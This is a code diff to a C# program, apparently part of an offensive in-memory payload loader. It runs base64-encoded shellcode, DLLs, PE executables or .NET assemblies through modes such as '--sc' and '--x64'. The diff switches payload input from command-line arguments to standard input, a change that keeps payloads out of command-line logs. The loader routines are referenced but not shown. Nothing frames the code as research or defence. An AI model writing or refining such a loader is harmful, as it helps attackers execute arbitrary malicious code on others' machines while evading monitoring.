@@ -18,7 +18,7 @@ namespace winClient48
         [STAThread]
         static void Main(string[] args)
         {
-            if (args.Length > 1)
+            if (args.Length > 0)
             {
                 clsfnLoader loader = new clsfnLoader();
 
@@ -26,28 +26,28 @@ namespace winClient48
                 {
                     if (args[0] == "--sc")
                     {
-                        string szB64 = args[1];
+                        string szB64 = Console.In.ReadToEnd();
                         byte[] abShellcode = Convert.FromBase64String(szB64);
 
                         loader.fnShellCodeLoader(abShellcode);
                     }
                     else if (args[0] == "--dll")
                     {
-                        string szB64 = args[1];
+                        string szB64 = Console.In.ReadToEnd();
                         byte[] abDllBytes = Convert.FromBase64String(szB64);
 
                         loader.fnLdrLoadDll(abDllBytes);
                     }
                     else if (args[0] == "--x64")
                     {
-                        string szB64 = args[1];
+                        string szB64 = Console.In.ReadToEnd();
                         byte[] abExe = Convert.FromBase64String(szB64);
 
-                        loader.fnLoadPeIntoMemory(abExe);
+                        var ret = loader.fnLoadPeIntoMemory(abExe);
                     }
                     else if (args[0] == "--cs")
                     {
-                        string szB64 = args[1];
+                        string szB64 = Console.In.ReadToEnd();
                         byte[] abDotNetExe = Convert.FromBase64String(szB64);
                         string[] parameters = args.Skip(2).ToArray();
 
